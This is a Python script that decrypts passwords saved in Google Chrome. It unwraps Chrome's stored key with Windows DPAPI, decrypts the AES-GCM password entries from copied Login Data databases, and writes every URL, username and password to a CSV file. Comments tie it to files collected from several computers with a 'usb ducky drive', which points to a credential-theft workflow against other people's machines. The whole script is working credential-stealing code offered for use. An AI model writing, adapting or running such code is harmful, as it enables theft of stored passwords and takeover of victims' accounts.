#Full Credits to LimerBoy
from os import environ
from os import path
from json import loads
from base64 import b64decode
from win32crypt import CryptUnprotectData
from shutil import copy2
from sqlite3 import connect
from csv import writer
from os import listdir, remove
from re import search
from Cryptodome.Cipher import AES

#GLOBAL CONSTANT
#CHROME_PATH_LOCAL_STATE = normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(environ['USERPROFILE']))
#CHROME_PATH = normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(environ['USERPROFILE']))

CHROME_PATH = path.normpath(r"D:\pass") # TODO: change this to your path to the usb ducky drive
CHROME_PATH_LOCAL_STATE = path.normpath(r"D:\pass\LocalState")

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        secret_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print("database: ", chrome_path_login_db)
        copy2(chrome_path_login_db, "Loginvault.db") 
        return connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def getLoginDataIds(pathToChrome):
    for file in listdir(pathToChrome):
        # find the id of the files (five digits at the end of the filename)
        if path.isfile(path.join(pathToChrome, file)) and "LocalState" in file:
            yield file.split('.')[1]


if __name__ == '__main__':
    try:
        #Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            
            for fileId in getLoginDataIds(CHROME_PATH):# get the random id at end of file
                # for every computer the files where taken from get the passwords
                CHROME_PATH_LOCAL_STATE = path.normpath(r"D:\pass\LocalState.{}".format(fileId))
                #(1) Get secret key
                secret_key = get_secret_key()
                #(2) Get ciphertext from sqlite database
                for file in listdir(CHROME_PATH):
                    if path.isfile(path.join(CHROME_PATH, file)) and "LoginData" in file and fileId in file:
                        chrome_path_login_db = path.normpath(r"%s\%s"%(CHROME_PATH, file))
                        conn = get_db_connection(chrome_path_login_db)
                        if(secret_key and conn):
                            cursor = conn.cursor()
                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                            for index,login in enumerate(cursor.fetchall()):
                                url = login[0]
                                username = login[1]
                                ciphertext = login[2]
                                if(url!="" and username!="" and ciphertext!=""):
                                    #(3) Filter the initialisation vector & encrypted password from ciphertext 
                                    #(4) Use AES algorithm to decrypt the password
                                    decrypted_password = decrypt_password(ciphertext, secret_key)
                                    print("Sequence: %d"%(index))
                                    print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                                    print("*"*50)
                                    #(5) Save into CSV 
                                    csv_writer.writerow([index,url,username,decrypted_password])
                            #Close database connection
                            cursor.close()
                            conn.close()
                            #Delete temp login db
                            remove("Loginvault.db")
    except Exception as e:
        print("[ERR] "%str(e))
        
        
